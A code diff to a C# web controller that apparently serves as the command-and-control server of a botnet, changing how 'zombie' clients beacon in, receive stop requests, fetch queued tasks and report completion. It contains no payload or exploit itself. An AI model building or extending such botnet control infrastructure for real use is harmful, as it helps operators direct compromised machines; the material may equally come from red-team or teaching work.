@@ -61,17 +61,31 @@ public class ZombieController : AbstractController
     [ProducesResponseType(typeof(ActionPoco), StatusCodes.Status200OK)]
     public IActionResult Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
     {
-        BotClient bot = C2State.BotManager.Bots[bot_id];
+        BotClient bot = GetBot(bot_id);
+
+        bot.CurrentProgress = progress;
 
         Console.WriteLine($"Zombie beaconed: {bot.Name} | {bot_id}");
 
-        
         bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
 
-        if (task_id < 0 || progress == ProgressEnum.FAILURE || progress == ProgressEnum.SUCCESS)
+        if (bot.StopRequested)
+        {
+            bot.StopRequested = false;
+            bot.TaskId = -1;
+            return Ok(new ActionPoco() { Action = ActionEnum.STOP });
+        }
+
+        if (task_id < 0) // Task invalid - get a new one
         {
             return Ok(new ActionPoco() { Action = ActionEnum.REQUEST });
-        } else
+        }
+        else if (progress is ProgressEnum.FAILURE or ProgressEnum.SUCCESS) // Valid task completed - move it from executing to completed
+        {
+            _ = C2State.TaskManager.CompleteTask(task_id);
+            return Ok(new ActionPoco() { Action = ActionEnum.REQUEST });
+        }
+        else // task valid but still executing - continue
         {
             return Ok(new ActionPoco() { Action = ActionEnum.CONTINUE });
         }
@@ -82,7 +96,7 @@ public class ZombieController : AbstractController
     [ProducesResponseType(StatusCodes.Status204NoContent)]
     public new IActionResult Request([FromQuery] int bot_id)
     {
-        BotClient bot = C2State.BotManager.Bots[bot_id];
+        BotClient bot = GetBot(bot_id);
         Console.WriteLine($"Zombie requested task: {bot.Name} | {bot_id}");
 
         // Get the next task in queue
@@ -92,6 +106,7 @@ public class ZombieController : AbstractController
         {
             // If task - send to zombie
             bot.TaskId = task.Id;
+            Console.WriteLine($"Sending out new task: {task.Task}");
             return Ok(task);
         }
 
